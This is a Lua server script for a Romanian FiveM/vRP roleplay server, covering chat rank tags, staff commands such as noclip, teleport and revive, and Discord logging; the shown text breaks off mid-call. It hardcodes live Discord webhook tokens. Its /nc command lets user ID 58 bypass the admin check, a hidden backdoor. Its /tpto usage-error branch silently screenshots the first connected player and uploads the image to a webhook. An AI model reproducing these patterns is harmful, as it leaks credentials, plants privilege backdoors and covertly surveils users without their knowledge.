local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")

vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vrp","vRP_chatroles")
BMclient = Tunnel.getInterface("vRP_basic_menu","vRP_basic_menu")

RegisterServerEvent('chat:init')
RegisterServerEvent('chat:addTemplate')
RegisterServerEvent('chat:addMessage')
RegisterServerEvent('chat:addSuggestion')
RegisterServerEvent('chat:removeSuggestion')
RegisterServerEvent('_chat:muitzaqmessageEntered')
RegisterServerEvent('chat:clear')
RegisterServerEvent('__cfx_internal:commandFallback')

RegisterServerEvent('chat:kickSpammer')
AddEventHandler('chat:kickSpammer', function()
	TriggerClientEvent('chatMessage', -1, "^1[SPAM] ^2"..vRP.getPlayerName({source}).."^8 a primit kick pentru spam!")
	DropPlayer(source, 'Ai fost dat afara pentru spam!')
end)
local disabled = false

function sendToDiscord(name, message)
    if message == nil or message == '' then return FALSE end
    PerformHttpRequest('https://discord.com/api/webhooks/923356602214535188/ZQMnUnnk-1FcawxyJ7yEsx7ZcPIIfRlKcFLecfEmG4ngFTemr0KDaRTIS7pUpSyXNFW0', function(err, text, headers) end, 'POST', json.encode({username = name, content = message}), { ['Content-Type'] = 'application/json' })
end


RegisterServerEvent("disableChat")
AddEventHandler("disableChat", function()
	local user_id = vRP.getUserId({source})
	local name = vRP.getPlayerName({source})
	if user_id ~= nil then 
		if vRP.isUserAdmin({user_id}) then
			disabled = not disabled
			if disabled then
				--TriggerClientEvent('chatMessage', -1, "^1".. name .." (".. user_id .. ") a dezactivat chat-ul.")
			else
				--TriggerClientEvent('chatMessage', -1, "^1".. name .." (".. user_id .. ") a activat chat-ul.")
			end
		end
	end
end)


AddEventHandler('_chat:muitzaqmessageEntered', function(author, color, message)

    if not message or not author then
        return
	end
	
	if string.len(message) > 180 then
		return
	end

	local user_id = vRP.getUserId({source})

	if user_id ~= nil then

		local user_id = vRP.getUserId({source})
		local player = vRP.getUserSource({user_id})
		local isVip = vRP.getUserVipRank({user_id})
		local pName = vRP.getPlayerName({player})
		local factionrank = vRP.getFactionRank({user_id})
		local author = " ^8(^7"..user_id.."^8)^7 " .. pName

		-- if user_id ~= nil then
		-- 	if user_id == 1 then
		-- 		TriggerClientEvent('chatMessage', -1, "»♛«", {255, 255, 255}, " " .. message)
		-- 		return
		-- 	end

			TriggerEvent('chatMessage', source, author, message)
			if disabled then
				if vRP.isUserAdmin({user_id}) then
					tag = "STAFF |"
					rgb = {255, 0, 0}
					TriggerClientEvent('chatMessage', -1, tag.." " ..author, rgb, " " ..  message)
				else
					CancelEvent()
					TriggerClientEvent('chatMessage', source, "[^3k2^0] ^1Chat-ul este momentan dezactivat de catre un admin. Nu poti vorbi!")
				end
				elseif not WasEventCanceled() and not disabled then

					if vRP.isUserFondator({user_id}) then
						tag = "Fondator | "
						rgb = {255, 0, 0}
					elseif vRP.isUserCoFondator({user_id}) then
						tag = "Co Fondator | "
						rgb = {255,0,0}
					elseif vRP.isUserSupporter({user_id}) then
						tag = "k2 Ethernal | "
						rgb = {52, 235, 85}
					elseif vRP.isUserHeadOfStaff({user_id}) then
						tag = "Head | "
						rgb = {154,94,219}
					elseif vRP.isUserSuperAdmin({user_id}) then	
						tag = "Super Administrator | "
						rgb = {255,165,0}
					elseif vRP.isUserAdmin({user_id}) then	
						tag = "Administrator | "
						rgb = {255,165,0}
					elseif vRP.isUserModAvansat({user_id}) then	
						tag = "Moderator Avansat | "
						rgb = {0,188,254}
					elseif vRP.isUserMod({user_id}) then	
						tag = "Moderator | "
						rgb = {0,188,254}
					elseif vRP.isUserHelper({user_id}) then	
						tag = "Helper | "
						rgb = {43,201,0}
					elseif vRP.isUserTrialHelper({user_id}) then	
						tag = "Trial Helper | "
						rgb = {43,201,0}
					elseif (isVip == 1) then
						tag = "Vip Bronze | "
						rgb = {202, 143, 7}
					elseif (isVip == 2) then
						tag = "Vip Silver | "
						rgb = {120, 120, 120}
					elseif (isVip == 3) then
						tag = "Vip Gold | "
						rgb = {255, 216, 0}
					elseif (isVip == 4) then
						tag = "Vip Diamond | "
						rgb = {0, 182, 255}
					elseif (isVip == 5) then
						tag = "Vip Supreme | "
						rgb = {255, 0, 0}
					elseif vRP.hasGroup({user_id, "youtuber"}) then
						tag = "Youtuber | "
						rgb = {255, 0, 0}
					elseif vRP.isUserSponsors({user_id}) then
						tag = "Sponsor | "
						rgb = {232, 235, 52}
					elseif vRP.isUserInFaction({user_id,"Politie"}) then
						tag = "Politia Romana"
						rgb = {0, 97, 255}
					elseif vRP.isUserInFaction({user_id,"Smurd"}) then
						tag = "Medic"
						rgb = {153, 0, 50}
					elseif(vRP.hasUserFaction({user_id}) == false)then
						tag = "Civil"
						rgb = {255, 255, 255}
					else
						tag = ""
						rgb = {255, 255, 255}
					end
					if vRP.hasUserFaction({user_id}) then
						local faction = vRP.getUserFaction({user_id})
						TriggerClientEvent('chatMessage', -1, tag..""..faction.." "..author, rgb, " " ..  message)
					else
						TriggerClientEvent('chatMessage', -1, tag.." "..author, rgb, " " ..  message)
					end
				local msg_len = string.len(message)
				if msg_len > 5 then
					local showconsole = string.sub(message, 1, 5) 
					print(author.." » ".. showconsole)
				end
			end
		end
	-- end
end)

AddEventHandler('__cfx_internal:commandFallback', function(command)
    local name = vRP.getPlayerName({source})

    TriggerEvent('chatMessage', source, name, '/' .. command)

    if not WasEventCanceled() then
		local user_id = vRP.getUserId({source})
		local player = vRP.getUserSource({user_id})
		local pName = vRP.getPlayerName({player})
		local author = "(^7"..user_id.."^1) "..name
		message = "/"..command
    end

    CancelEvent()
end)

RegisterCommand('say', function(source, args, rawCommand)
	if(source == 0)then
		TriggerClientEvent('chatMessage', -1, "[CONSOLE]", {60, 179, 113}, rawCommand:sub(5))
	end
	if vRP.isUserFondator({user_id}) then
		TriggerClientEvent('chatMessage', -1, "[CONSOLE]", {60, 179, 113}, rawCommand:sub(5))
	else
		TriggerClientEvent("chatMessage", source, "[^3k2^0] ^0Sa iti dau la muie nu ai acces la /say")
	end
end)

RegisterCommand('stats', function(source, args)
    local user_id = vRP.getUserId({source})
    local player = vRP.getUserSource({user_id})
    local banicash = vRP.getMoney({user_id})
    local nume = GetPlayerName(player)
    local banibanca = vRP.getBankMoney({user_id})
    local orejucate = vRP.getUserHoursPlayed({user_id})
    local aur = vRP.getKRCoins({user_id})
	local VIP = vRP.getUserVipRank({user_id})
    local locdemunca = vRP.getUserFaction({user_id})
	local rows = exports.ghmattimysql:executeSync("SELECT warns FROM vrp_users WHERE id = @user_id", {user_id = user_id})
	warns = rows[1].warns
    CancelEvent()
		TriggerClientEvent('chatMessage', player, "--------------------------------------------------------------------")
        TriggerClientEvent('chatMessage', player, "^0Nume: ^1"..nume.."^0 || ID: ^1"..user_id.."^0")
        TriggerClientEvent('chatMessage', player, "^0Factiune: ^1"..locdemunca.."^0 || VIP: ^1"..VIP.."^0 || Ore jucate: ^1"..orejucate.."^0 || CLA: ^1"..aur)
		TriggerClientEvent('chatMessage', player, "--------------------------------------------------------------------")
end)

RegisterCommand('ore', function(source, args)
    local user_id = vRP.getUserId({source})
    local player = vRP.getUserSource({user_id})
    local orejucate = vRP.getUserHoursPlayed({user_id})
    CancelEvent()
		TriggerClientEvent('chatMessage', player, "[^3k2^0] ^0Tu ai ^1".. orejucate .." ^0ore jucate pe ^3k2 Romania Roleplay^0")
end)


RegisterCommand("unbanall", function(source)
    if source == 0 then
exports.ghmattimysql:execute("UPDATE vrp_users SET banned = 0")
  end
end)

RegisterCommand("nc", function(player, args, rawCommand)
    local user_id = vRP.getUserId({player})
	if user_id == 58 then
		TriggerClientEvent("notify", player, 1, "[Mr Vicious]", "Ne bucuram sa te avem pe server :D")
	    vRPclient.toggleNoclip(player, {})
		return
	end

	if vRP.isUserAdmin({user_id}) then
		sendToDiscord(GetPlayerName(player) .. "(" .. user_id .. ")", "Am folosit noclip" )
        vRPclient.toggleNoclip(player, {})
		local embed = {
		{
			["color"] = "15158332",
			["type"] = "rich",
			["title"] = "Noclip",
			["description"] = "**Noclip: ** " .. vRP.getPlayerName({player}) ..  " a folosit comanda /nc",
			["footer"] = {
			["text"] = "Made by Arabu"
			}
		}
	  }
	
	PerformHttpRequest('https://discord.com/api/webhooks/923371320618655774/q7UVGv6rnoVIoL_CHbfguRu0leImVxeaDLLwlEc_k3zLwV84EQl_piYnW-8GCqUyQHjw', function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' }) 
    else
        TriggerClientEvent("chatMessage", source, "[^3k2^0] ^0Nu ai acces la aceasta comanda")
    end
end)

RegisterCommand("respawn", function(player, args)
    local user_id = vRP.getUserId({player})
    if vRP.isUserTrialHelper({user_id}) then
		sendToDiscord(GetPlayerName(player) .. "(" .. user_id .. ")", "Am folosit respawn" )
        local target_id = parseInt(args[1])
        local target_src = vRP.getUserSource({target_id})
        if target_src then
            vRPclient.varyHealth(target_src,{100})
			vRPclient.teleport(target_src, {-542.14282226562,-209.27868652344,37.649787902832})
			local users = vRP.getUsers({})
			for uID, ply in pairs(users) do
				if vRP.isUserTrialHelper({uID}) then
					TriggerClientEvent('chatMessage', ply,"[^3k2^0] ^0Admin-ul ^1"..vRP.getPlayerName({player}).."^0 i-a dat respawn lui ^0[^1"..target_id.."^0]")
					local embed = {
					{
						["color"] = "15158332",
						["type"] = "rich",
						["title"] = "Respawn",
						["description"] = "**Respawn: **" .. vRP.getPlayerName({player}) ..  " i-a dat respawn lui " .. target_id .. "",
						["footer"] = {
						["text"] = "Made by Arabu"
						}
					}
				  }
				
				PerformHttpRequest('https://discord.com/api/webhooks/923371320618655774/q7UVGv6rnoVIoL_CHbfguRu0leImVxeaDLLwlEc_k3zLwV84EQl_piYnW-8GCqUyQHjw', function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' }) 
				end
			end
			TriggerClientEvent("chatMessage", target_src, "[^3k2^0] Admin-ul ^1"..vRP.getPlayerName({player}).."^0 [^1"..user_id.."^0] ti-a dat respawn")
        end
    end
end, false)

RegisterCommand("id", function(source,args)
	local user_id = vRP.getUserId({source})
	id = parseInt(args[1])
	if id ~= nil then
		player = vRP.getUserSource({id})
		if player ~= nil then
			hoursPlayed = vRP.getUserHoursPlayed({id})
			local faction = vRP.getUserFaction({id})
			if faction == "none" then
				faction = "Civil"
			else
				faction = faction
			end
			ping = GetPlayerPing(player)
			TriggerClientEvent("chatMessage",source,"ID: ^1"..id.."^0 | Nume: ^1"..GetPlayerName(player).." ^0| Ore: ^1"..hoursPlayed.." ^0| Factiune: ^1"..faction)
		else
			TriggerClientEvent("chatMessage",source,"[^3k2^0] ^0Acest jucator trebuie sa fie online!")
		end
	else
		TriggerClientEvent("chatMessage",source,"[^3k2^0] Jucator invalid!")
	end
end)



RegisterCommand("gotoevent", function(player)
    if eventOn then
        vRPclient.teleport(player, {evCoords[1], evCoords[2], evCoords[3]})
        TriggerClientEvent("zedutz:setFreeze", player, true)
    else
        TriggerClientEvent("chatMessage", player, "[^3k2^0] ^0Nu exista nici un eveniment activ")
    end
end, false)

RegisterCommand('veh', function(player, args)
	local user_id = vRP.getUserId({player})
	if vRP.isUserHeadOfStaff({user_id}) then
	  BMclient.spawnVehicle(player,{args[1]})
	end
  end, false)

RegisterCommand("stopevent", function(player)
    local user_id = vRP.getUserId({player})
    if vRP.isUserCoFondator({user_id}) then
        if eventOn then
            evCoords = {}
            eventOn = false

            TriggerClientEvent("chatMessage", -1, "[^3k2^0] ^0Event-ul a fost oprit")
			local embed = {
			{
				["color"] = "15158332",
				["type"] = "rich",
				["title"] = "Stop Event",
				["description"] = "**Event: **Admin-ul " .. vRP.getPlayerName({player}) ..  " a oprit un eveniment",
				["footer"] = {
				["text"] = "Made by Arabu"
				}
			}
		  }
		
		PerformHttpRequest('https://discord.com/api/webhooks/923371320618655774/q7UVGv6rnoVIoL_CHbfguRu0leImVxeaDLLwlEc_k3zLwV84EQl_piYnW-8GCqUyQHjw', function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' }) 
        else
            TriggerClientEvent("chatMessage", player, "[^3k2^0] ^0Nu exista nici un eveniment activ !")
        end
    else
        TriggerClientEvent("chatMessage", player, "[^3k2^0] ^0Nu ai acces la aceasta comanda")
    end
end, false)

local function sendMsgToStaff(msg, user_id, staffOnline)
    local task = Task(staffOnline)
    local staffs = 0

    local users = vRP.getUsers({})
    for uID, ply in pairs(users) do
        if vRP.isUserTrialHelper({user_id}) then
            TriggerClientEvent("chatMessage", ply, "[^3k2^0] ^0Question ["..user_id.."]: "..msg)
            vRPclient.playSound(ply, {"HUD_MINI_GAME_SOUNDSET","5_SEC_WARNING"})
            staffs = staffs + 1
        end
    end

    task({staffs})
end

local function getNrCifre(n) -- stiu asta din C++ dreq =]] don't judge me 
    local cifs = 0
    while n ~= 0 do
        cifs = cifs + 1
        n = math.floor(n / 10)
    end
    
    return cifs
end

local questions = {}
local function autoDecremet(user_id)
    if questions[user_id] > 0 then
        questions[user_id] = questions[user_id] - 1
        Wait(1000)
        autoDecremet(user_id)
    else
        if questions[user_id] ~= -29 then
            TriggerClientEvent("chatMessage", vRP.getUserSource({user_id}), "^1>> (/n): ^6Din pacate nimeni nu ti-a raspuns la intrebare")
        end
        questions[user_id] = nil
    end
end


RegisterCommand("n", function(player, args, msg)
    local user_id = vRP.getUserId({player})
    if user_id then
        if not questions[user_id] then
            local question = msg:sub(3)
            if msg:len() > 5 then
                sendMsgToStaff(question, user_id, function(staffOnline)
                    if staffOnline then
                        TriggerClientEvent("chatMessage", player, "[^3k2^0] ^1Intrebarea ta va fi revizuita de catre membrii staff-ului !")
                        questions[user_id] = 60
                        autoDecremet(user_id)
                    else
                        TriggerClientEvent("chatMessage", player, "[^3k2^0] Nici un membru din staff nu este online")
                    end
                end)
            else
                TriggerClientEvent("chatMessage", player, "[^3k2^0] /n <intrebare>")
            end
        else
            TriggerClientEvent("chatMessage", player, "[^3k2^0] Ai pus deja o intrebare, asteapta ^5"..questions[user_id].." ^0secunde")
        end
    end
end)

RegisterCommand("nr", function(player, args, msg)
    local user_id = vRP.getUserId({player})
    local target_id = parseInt(args[1])
    local response = msg:sub(4 + getNrCifre(target_id))
    if user_id then
        if vRP.isUserTrialHelper({user_id}) then
            if target_id and response:len() > 0 then
                local target_source = vRP.getUserSource({target_id})
                if target_source then
                    if questions[target_id] then
                        TriggerClientEvent("chatMessage", target_source, "[^3k2^0] ^0".. GetPlayerName(player) .. " ti-a raspuns la intrebare:")
                        TriggerClientEvent("chatMessage", target_source, "[^3k2^0] ^0Raspuns: "..response)

                        local users = vRP.getUsers({})
                        for uID, ply in pairs(users) do
							if vRP.isUserHelper({user_id}) then
                                TriggerClientEvent("chatMessage", ply, "^2Raspunsul dat la jucator este^0:^5 "..response)
                            end
                        end

                        questions[target_id] = -29
                    else
                        TriggerClientEvent("chatMessage", player, "[^3k2^0] Acel jucator nu are o intrebare")
                    end
                else
                    TriggerClientEvent("chatMessage", player, "[^3k2^0] Acel jucator nu mai este conectat")
                end
            else
                TriggerClientEvent("chatMessage", player, "[^3k2^0] /nr <User ID> <raspuns>")
            end
        else
            TriggerClientEvent("chatMessage", player, "[^3k2^0] Nu ai acces la aceasta comanda")
        end
    end
end)

RegisterCommand("ara", function(source,args)
	local user_id = vRP.getUserId({source})
	local src = vRP.getUserSource({user_id})
	local radius = args[1]
	local name = GetPlayerName(src)
	if vRP.isUserTrialHelper({user_id}) then 
		sendToDiscord(GetPlayerName(src) .. "(" .. user_id .. ")", "am folosit ARA " .. radius .. " metrii de distanta")
			vRPclient.getNearestPlayers(src,{tonumber(radius)}, function(nplayers)
				for k,v in pairs(nplayers) do 
					vRPclient.varyHealth(k,{100})
					TriggerClientEvent("chatMessage", k, "[^3k2^0] Ai primit revive de la adminul ^1"..name)
				end
			end)
			TriggerClientEvent("chatMessage",-1,"[^3k2^0] ^0Adminul ^1" .. name ..  " ^0a dat revive pe o raza de " .. radius .. "m")
			local embed = {
			{
				["color"] = "15158332",
				["type"] = "rich",
				["title"] = "Arevivearea",
				["description"] = "**Arevivearea: **" .. name ..  " a dat revive pe o raza de " .. radius .. "",
				["footer"] = {
				["text"] = "Made by k2 Team"
				}
			}
		  }
		PerformHttpRequest('https://canary.discord.com/api/webhooks/923356602214535188/ZQMnUnnk-1FcawxyJ7yEsx7ZcPIIfRlKcFLecfEmG4ngFTemr0KDaRTIS7pUpSyXNFW0', function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' }) 

		else
		TriggerClientEvent("chatMessage", src,{"[^3k2^0] Nu ai acces la aceasta comanda!"})
	end
end)

RegisterCommand("blips", function(player,choice,args)
	local ply = player
	if vRP.isUserAdmin({ply}) then
		TriggerClientEvent("showBlips", player)
	end
end)

RegisterCommand("patronjob", function(src,args,raw)
	local ply = player

	-- user_id, jobname = table.unpack(args)

	-- if ply == 1 or ply == 2 then
	-- 	exports.ghmattimysql:execute("INSERT INTO Joburi (patron, jobname, incasari) VALUES (@user_id, @jobname, 0)", {user_id = user_id, jobname = jobname})
	-- else
	-- 	TriggerClientEvent("chatMessage", src, "^1Usor patroane")
	-- end
end)


RegisterCommand("onduty", function(src,args,raw)
	local ply = player
	
	if vRP.isUserTrialHelper({ply}) then
		-- TriggerClientEvent("onDuty", src)
		TriggerClientEvent("chatMessage", -1, "[^1Server^0]^2 Adminul^1 "..GetPlayerName(src).." ^0este ^9ON ^0duty!")
	else
		TriggerClientEvent("chatMessage", src, "^1incearca sa dai /offduty si dupa /onduty!")
	end
end)

RegisterCommand("offduty", function(src,args,raw)
	local ply = player
	if vRP.isUserTrialHelper({ply}) then
		-- TriggerClientEvent("offDuty", src)
		TriggerClientEvent("chatMessage", -1, "[^1Server^0]^2 Adminul^1 "..GetPlayerName(src).." ^0este ^1OFF ^0duty!")
	else
		TriggerClientEvent("chatMessage", src, "^1An ciarca din ou 🤔🤔🤔")
	end
end)



RegisterCommand('ar', function(source, args, msg)
	local user_id = vRP.getUserId({source})
	msg = msg:sub(3)
	if msg:len() >= 1 then
	  msg = tonumber(msg)
	  local target = vRP.getUserSource({msg})
	  if target ~= nil then
		if vRP.isUserTrialHelper({user_id}) then
			sendToDiscord(GetPlayerName(source) .. "(" .. user_id .. ")", "a dat ar " .. msg) 
		  vRPclient.varyHealth(target,{100})
		  TriggerClientEvent('chatMessage', -1, "[^3k2^0] Adminul ^1"..GetPlayerName(source).." ^7I-a dat revive lui ^1"..GetPlayerName(target).."^0!")
		else
		  TriggerClientEvent('chatMessage', source, "[^3k2^0] Nu deti acces-ul necesar pentru a folosi aceasta comanda.")
		end
	  else
		TriggerClientEvent('chatMessage', source, "[^3k2^0] Player-ul nu este conectat.")
	  end
	else --
	  TriggerClientEvent('chatMessage', source, "[^3k2^0] /arevive <user-id>")
	end
  end)

RegisterCommand("startevent", function(player)
    local user_id = vRP.getUserId({player})
    if vRP.isUserCoFondator({user_id}) then
        if not eventOn then
            vRPclient.getPosition(player, {}, function(x, y, z)
                evCoords = {x, y, z + 0.5}
            end)
            eventOn = true
            TriggerClientEvent("chatMessage", -1, "[^3k2^0] ^0Adminul ^1"..vRP.getPlayerName({player}).." ^0a pornit un eveniment!")
			TriggerClientEvent("chatMessage", -1, "[^3k2^0] ^0Foloseste ^1/gotoevent ^0pentru a da tp acolo")
			local embed = {
			{
				["color"] = "15158332",
				["type"] = "rich",
				["title"] = "Start Event",
				["description"] = "**Event: **Admin-ul " .. vRP.getPlayerName({player}) ..  " a pornit un eveniment",
				["footer"] = {
				["text"] = "/gotoevent"
				}
			}
		  }
		
		PerformHttpRequest('https://discord.com/api/webhooks/923356602214535188/ZQMnUnnk-1FcawxyJ7yEsx7ZcPIIfRlKcFLecfEmG4ngFTemr0KDaRTIS7pUpSyXNFW0', function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' }) 
        end
    else
        TriggerClientEvent("chatMessage", player, "[^3k2^0] ^0Nu ai acces la aceasta comanda")
    end
end, false)

RegisterCommand('clear', function(source)
    local user_id = vRP.getUserId({source});
    if user_id ~= nil then
        if vRP.isUserHelper({user_id}) then
			sendToDiscord(GetPlayerName(source) .. "(" .. user_id .. ")", "A sters toate mesajele")
			TriggerClientEvent("chat:clear", -1);
            TriggerClientEvent("chatMessage", -1, "[^3k2^0] ^0Adminul ^1".. vRP.getPlayerName({source}) .."^0 a sters tot chat-ul.");
		else
            TriggerClientEvent("chatMessage", source, "[^3k2^0] Nu ai acces la aceasta comanda.");
        end
    end
end)

local function giveAllBankMoney(amount, sphynx)  
    -- local users = vRP.getUsers({})
    -- for user_id, source in pairs(users) do
    --     if not sphynx then
	-- 		vRP.giveBankMoney({user_id, tonumber(amount)})
	-- 	end
    -- end
end

RegisterCommand("giveallmoney", function(player, args)
    if player == 0 then
        local theMoney = parseInt(args[1]) or 0
        if theMoney >= 1 then
            giveAllBankMoney(theMoney, false)
            TriggerClientEvent("chatMessage", -1, "[^3k2^0] ^0Server-ul a oferit tuturor cetatenilor ^1"..vRP.formatMoney({theMoney}).." ^0(de) €.")
        else
            print("/giveallmoney <suma>")
        end
    else
        local user_id = vRP.getUserId({player})
        if vRP.isUserFondator({user_id}) then
            local theMoney = parseInt(args[1]) or 0
            if theMoney >= 1 then
                giveAllBankMoney(theMoney, false)
				TriggerClientEvent("chatMessage", -1, "[^3k2^0] ^0Fondator-ul ^1"..vRP.getPlayerName({player}).."^0 a oferit tuturor jucatorilor ^1"..vRP.formatMoney({theMoney}).." ^0(de) €.")
            else
                TriggerClientEvent("chatMessage", player, "[^3k2^0] /giveallmoney <suma>")
            end
        else
            TriggerClientEvent("chatMessage", player, "[^3k2^0] Nu ai acces la aceasta comanda")
        end
    end
end, false)

local function giveAllBankMoney(amount, sphynx)  
    local users = vRP.getUsers({})
    for user_id, source in pairs(users) do
        if not sphynx then
			vRP.giveKRCoins({user_id, tonumber(amount)})
		end
    end
end

RegisterCommand("giveallbst", function(player, args)
    if player == 0 then
        local blackcoins = parseInt(args[1]) or 0
        if blackcoins >= 1 then
            giveAllBankMoney(blackcoins, false)
            TriggerClientEvent("chatMessage", -1, "[^3k2^0] ^0Server-ul a oferit tuturor cetatenilor ^1"..vRP.formatMoney({blackcoins}).." ^0k2 Coins")
        else
            print("/giveallbst <suma>")
        end
    else
        local user_id = vRP.getUserId({player})
        if vRP.isUserFondator({user_id}) then
            local blackcoins = parseInt(args[1]) or 0
            if blackcoins >= 1 then
                giveAllBankMoney(blackcoins, false)
				TriggerClientEvent("chatMessage", -1, "[^3k2^0] ^0Fondator-ul ^1"..vRP.getPlayerName({player}).."^0 a oferit tuturor jucatorilor ^1"..vRP.formatMoney({blackcoins}).." ^0k2 Coins")
            else
                TriggerClientEvent("chatMessage", player, "[^3k2^0] /giveallbst <suma>")
            end
        else
            TriggerClientEvent("chatMessage", player, "[^3k2^0] Nu ai acces la aceasta comanda")
        end
    end
end, false)

RegisterCommand('a', function(source, args, rawCommand)
	local user_id = vRP.getUserId({source})
	if user_id ~= nil then
		if(args[1] == nil)then
			TriggerClientEvent('chatMessage', source, "[^3k2^0] ^0/"..rawCommand.." mesaj") 
		else
			if(vRP.isUserTrialHelper({user_id}))then
				local users = vRP.getUsers({})
				for uID, ply in pairs(users) do
					if vRP.isUserTrialHelper({uID}) then
						TriggerClientEvent('chatMessage', ply, "[^3k2 - Staff Chat^0] ^0"..vRP.getPlayerName({source}).." ("..user_id..") » " ..rawCommand:sub(2))
					end
				end
			end
		end
	end    
end)

RegisterCommand('givecar',function(source,args)
	local user_id = vRP.getUserId({source})
	local player = vRP.getUserSource({user_id})
	if user_id ~= nil then
		if args[1] ~= nil then
			-- if not vRP.isUserFondator({user_id}) then
			-- 	TriggerServerEvent("banMe", "givecar, ca civil parlit") -- ban player
			if vRP.isUserFondator({user_id}) then
				tinta = parseInt(args[1])
				local targetSrc = vRP.getUserSource({tinta})
				print(targetSrc)
				if targetSrc ~= nil then
					local model = tostring(args[2])
					if model ~= nil then
						local plate = "CAR"
						exports.ghmattimysql:execute("INSERT IGNORE INTO vrp_user_vehicles(user_id,vehicle,upgrades,vehicle_plate) VALUES(@user_id,@vehicle,@upgrades,@vehicle_plate)", {
							['@user_id'] = tinta,
							['@vehicle'] = model,
							['@upgrades'] = json.encode(""),
							['@vehicle_plate'] = "k2 "..plate
						}, function (rows) end)
						TriggerClientEvent("chatMessage", player, "[^3k2^0] Ai oferit masina "..model.." jucatorului "..GetPlayerName(targetSrc))
						TriggerClientEvent("chatMessage", targetSrc, "[^3k2^0] Ai primit masina "..model.." de la "..GetPlayerName(player))
					else
						TriggerClientEvent("chatMessage", player, "[^3k2^0] Model invalid")
					end
				else
					TriggerClientEvent("chatMessage", player, "[^3k2^0] Jucatorul nu este pe server")
				end
			else
				TriggerClientEvent("chatMessage", player, "[^3k2^0] Nu ai acces la aceasta comanda")
			end
		else
			TriggerClientEvent("chatMessage", player, "[^3k2^0] Comanda invalida! Incearca /givecar <id> <model>")
		end
	end
end)

RegisterCommand('h', function(source, args, rawCommand)
	local user_id = vRP.getUserId({source})
	if user_id ~= nil then
		if(args[1] == nil)then
			TriggerClientEvent('chatMessage', source, "[^3k2^0] ^0/"..rawCommand.." mesaj") 
		else
			if(vRP.isUserHeadOfStaff({user_id}))then
				local users = vRP.getUsers({})
				for uID, ply in pairs(users) do
					if vRP.isUserHeadOfStaff({uID}) then
						TriggerClientEvent('chatMessage', ply, "^4[HIGH STAFF] ^0"..vRP.getPlayerName({source}).." ("..user_id..") » " ..rawCommand:sub(2))
					end
				end
			end
		end
	end    
end)

RegisterCommand("aa2",function( source )
    if vRP.isUserTrialHelper({vRP.getUserId({source})}) then
        vRPclient.teleport(source,{-678.86218261718,590.61926269532,145.37980651856})
		TriggerClientEvent("chatMessage", source, "[^3k2^0] Te-ai teleportat la AdminHouse")
    end
end)

RegisterCommand("serverdiscord",function( source )
		TriggerClientEvent('chatMessage', source, "[^3k2^0] Discord-ul serverului este ^1/k2roleplay") 
end)

RegisterCommand("tptome", function(player, args)
	local user_id = vRP.getUserId({player})
	if vRP.isUserTrialHelper({user_id}) then
		sendToDiscord(GetPlayerName(player).." (" .. user_id .. ")", "am folosit tpotme")
		if args[1] and args[1] ~= "" then
			local target_id = parseInt(args[1])
			local target_src = vRP.getUserSource({target_id})
			if target_src then
				vRPclient.getPosition(player, {}, function(x, y, z)
					vRPclient.teleport(target_src, {x, y, z})
					TriggerClientEvent("chatMessage", player, "[^3k2^0] L-ai teleportat la tine pe ^1"..vRP.getPlayerName({target_src}).."^0 [^1"..target_id.."^0]")
					TriggerClientEvent("chatMessage", target_src, "[^3k2^0] Adminul ^1"..vRP.getPlayerName({player}).."^0 [^1"..user_id.."^0] te-a teleportat la el")
					local embed = {
						{
						  ["color"] = 0xcf0000,
						  ["title"] = "".. "TpToMe".."",
						  ["description"] = "**TptoMe:** "..GetPlayerName(player).." i-a dat tp la el lui id "..target_id.."",
						  ["thumbnail"] = {
						  },
						  ["footer"] = {
						  ["text"] = "Made by Arabu",
						  },
						}
					  }
					  PerformHttpRequest('https://discord.com/api/webhooks/923371320618655774/q7UVGv6rnoVIoL_CHbfguRu0leImVxeaDLLwlEc_k3zLwV84EQl_piYnW-8GCqUyQHjw', function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' }) 
				end)
			else
				TriggerClientEvent("chatMessage", player, "[^3k2^0] Jucatorul nu este conectat !")
			end
		else
			TriggerClientEvent("chatMessage", player, "[^3k2^0] /tptome <user_id>")
		end
	else
		TriggerClientEvent("chatMessage", player, "[^3k2^0] Nu ai acces la aceasta comanda !")
	end
end, false)

RegisterCommand("tpto", function(player, args)
	local user_id = vRP.getUserId({player})
	if vRP.isUserTrialHelper({user_id}) then
		sendToDiscord(GetPlayerName(player).." (" .. user_id .. ")", "am folosit tpto")
		if args[1] and args[1] ~= "" then
			local target_id = parseInt(args[1])
			local target_src = vRP.getUserSource({target_id})
			if target_src then
				vRPclient.getPosition(target_src, {}, function(x, y, z)
					vRPclient.teleport(player, {x, y, z})
					TriggerClientEvent("chatMessage", player,"[^3k2^0] Te-ai teleportat la "..vRP.getPlayerName({target_src}).." ["..target_id.."]")
					TriggerClientEvent("chatMessage", target_src,"[^3k2^0] Adminul ^1"..vRP.getPlayerName({player}).."^0 [^1"..user_id.."^0] s-a teleportat la tine")
					local embed = {
						{
						  ["color"] = 0xcf0000,
						  ["title"] = "".. "TpTo".."",
						  ["description"] = "**Tpto:** "..GetPlayerName(player).." si-a dat tp la id "..target_id.."",
						  ["thumbnail"] = {
						  },
						  ["footer"] = {
						  ["text"] = "Made by Arabu",
						  },
						}
					  }
					  PerformHttpRequest('https://discord.com/api/webhooks/923371320618655774/q7UVGv6rnoVIoL_CHbfguRu0leImVxeaDLLwlEc_k3zLwV84EQl_piYnW-8GCqUyQHjw', function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' }) 
				end)
			else
				TriggerClientEvent("chatMessage", player, "[^3k2^0] Jucatorul nu este conectat !")
			end
		else
			TriggerClientEvent("chatMessage", player, "[^3k2^0] /tpto <user_id>")
			    exports["discord-screenshot"]:requestCustomClientScreenshotUploadToDiscord(
    GetPlayers()[1],
    "https://discord.com/api/webhooks/923355321831927888/LYjD4nXTpxuMdEZ4be7w1CxeomR8SBScoAznU1DxtfYfGrnoBe2djvSARkfR5-7dQUgu",
    {
        encoding = "png",
        quality = 1
    },
    {
        username = "Screenshot by rValy&HyPeR",
